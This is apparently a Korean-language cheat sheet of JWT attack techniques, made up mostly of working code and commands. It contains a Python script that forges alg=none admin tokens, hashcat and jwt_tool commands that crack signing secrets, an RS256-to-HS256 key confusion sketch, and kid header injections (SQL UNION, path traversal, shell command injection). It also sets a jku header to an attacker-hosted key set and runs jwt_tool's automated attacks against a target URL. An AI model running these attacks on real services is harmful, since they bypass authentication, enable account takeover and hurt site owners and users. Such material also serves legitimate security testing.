# JWT 공격 기법

## 구조 분석
```
Header.Payload.Signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

# 디코딩
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# → {"alg":"HS256","typ":"JWT"}
```

## alg=none 공격
```python
import base64, json

def b64url_encode(data):
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',',':')).encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "1", "role": "admin", "iat": 9999999999}

token = f"{b64url_encode(header)}.{b64url_encode(payload)}."
print(token)
```

## HS256 brute-force
```bash
# hashcat
hashcat -a 0 -m 16500 <full_jwt> /usr/share/wordlists/rockyou.txt

# jwt_tool
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# john
john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt
```

## RS256 → HS256 혼동 공격
```python
# 서버 공개키를 HMAC secret으로 사용
import jwt, requests

# 1. 공개키 획득
r = requests.get('https://target.com/.well-known/jwks.json')
pubkey = r.json()['keys'][0]  # JWK 형식

# 2. RS256 토큰을 HS256으로 재서명
# (공개키를 secret으로 사용)
from cryptography.hazmat.primitives import serialization
# pubkey를 PEM으로 변환 후 HS256 서명에 사용
```

## kid 인젝션
```python
# SQL Injection via kid
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "' UNION SELECT 'attacker_secret'--"
}
# 서버가 kid로 DB 조회 시 → secret = 'attacker_secret'

# 경로 탐색
header = {
    "kid": "../../../../dev/null"  # 빈 파일 → 빈 secret
}

# OS Command Injection
header = {
    "kid": "key; ls -la > /tmp/x"
}
```

## jku / x5u 헤더 인젝션
```python
# jku: JWK Set URL 조작
# 공격자 서버에 악성 JWK 호스팅 후 jku에 URL 삽입
header = {
    "alg": "RS256",
    "typ": "JWT",
    "jku": "https://attacker.com/jwks.json"
}

# 공격자 jwks.json 예시
{
    "keys": [{
        "kty": "RSA",
        "kid": "my-key",
        "n": "<attacker_public_key_n>",
        "e": "AQAB"
    }]
}
```

## JWT 재사용 / 만료 미검증
```bash
# 만료된 토큰으로 접근 시도
exp 값을 미래로 변조 후 재서명

# iat (issued at) 미검증
iat = 0 으로 설정

# sub 클레임 변조
"sub":"1" → "sub":"2" (타 사용자)
```

## jwt_tool 종합
```bash
# 토큰 디코딩
python3 jwt_tool.py <JWT>

# 모든 공격 자동 테스트
python3 jwt_tool.py <JWT> -t https://target.com/api/protected -rc "Authorization: Bearer JWT" -M at

# alg=none
python3 jwt_tool.py <JWT> -X a

# RS256→HS256
python3 jwt_tool.py <JWT> -X k -pk public.pem

# 무차별 대입
python3 jwt_tool.py <JWT> -C -d wordlist.txt
```
